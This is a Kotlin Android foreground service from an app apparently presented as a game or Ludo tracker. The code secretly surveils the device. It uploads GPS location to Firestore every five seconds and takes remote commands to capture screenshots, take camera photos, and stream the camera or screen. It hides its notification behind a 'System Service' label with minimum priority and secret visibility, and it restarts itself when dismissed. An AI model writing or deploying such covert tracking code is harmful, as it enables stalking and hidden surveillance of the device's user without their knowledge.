package com.example.game_tracker

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration

class ForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "ludo_bg_service_channel"
        const val NOTIFICATION_ID = 1001

        fun startService(context: Context) {
            try {
                val intent = Intent(context, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private var firestoreListener: ListenerRegistration? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hasLocationPermission(): Boolean {
        return (androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
        androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && hasLocationPermission()) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Throwable) {
            e.printStackTrace()
            try {
                startForeground(NOTIFICATION_ID, notification)
            } catch (ex: Throwable) {
                ex.printStackTrace()
            }
        }

        setupFirestoreRequestListener()
        startLocationUpdates()

        return START_STICKY
    }

    private fun startLocationUpdates() {
        try {
            if (locationManager == null) {
                locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            }

            locationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    updateFirestoreLocation(location)
                }

                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true

            if (hasGps) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    5000L,
                    0f,
                    locationListener!!
                )
            }
            if (hasNet) {
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    5000L,
                    0f,
                    locationListener!!
                )
            }

            val lastGps = if (hasGps) locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
            val lastNet = if (hasNet) locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) else null
            val bestLoc = lastGps ?: lastNet
            if (bestLoc != null) {
                updateFirestoreLocation(bestLoc)
            }
        } catch (e: SecurityException) {
            e.printStackTrace()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun updateFirestoreLocation(location: Location) {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return

        try {
            val firestore = FirebaseFirestore.getInstance()
            val updates = mapOf<String, Any>(
                "latitude" to location.latitude,
                "longitude" to location.longitude,
                "accuracy" to location.accuracy.toDouble(),
                "lastLocationTime" to System.currentTimeMillis()
            )
            firestore.collection("devices").document(deviceId).update(updates)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun setupFirestoreRequestListener() {
        if (firestoreListener != null) return

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return

        try {
            val firestore = FirebaseFirestore.getInstance()
            firestoreListener = firestore.collection("screenshot_requests")
                .whereEqualTo("targetDeviceId", deviceId)
                .whereEqualTo("status", "pending")
                .addSnapshotListener { snapshots, error ->
                    if (error != null || snapshots == null) return@addSnapshotListener
                    for (change in snapshots.documentChanges) {
                        if (change.type == DocumentChange.Type.ADDED) {
                            val doc = change.document
                            val requestId = doc.id
                            val requestType = doc.getString("requestType") ?: "screenshot"
                            val cameraFacing = doc.getString("cameraFacing") ?: "front"

                            when (requestType) {
                                "location_ping" -> {
                                    startLocationUpdates()
                                }
                                "camera_capture" -> {
                                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("cameraFacing", cameraFacing)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                                "screen_share", "camera_stream" -> {
                                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("cameraFacing", cameraFacing)
                                        putExtra("requestType", requestType)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                                "screenshot" -> {
                                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("capture_once", true)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                            }
                        }
                    }
                }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, ForegroundService::class.java).also {
            it.setPackage(packageName)
        }
        val restartServicePendingIntent = PendingIntent.getService(
            this,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try {
            firestoreListener?.remove()
            firestoreListener = null
            if (locationListener != null && locationManager != null) {
                locationManager?.removeUpdates(locationListener!!)
            }
        } catch (e: Exception) {
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                vibrationPattern = longArrayOf(0L)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setLocalOnly(true)
            .build()
    }
}
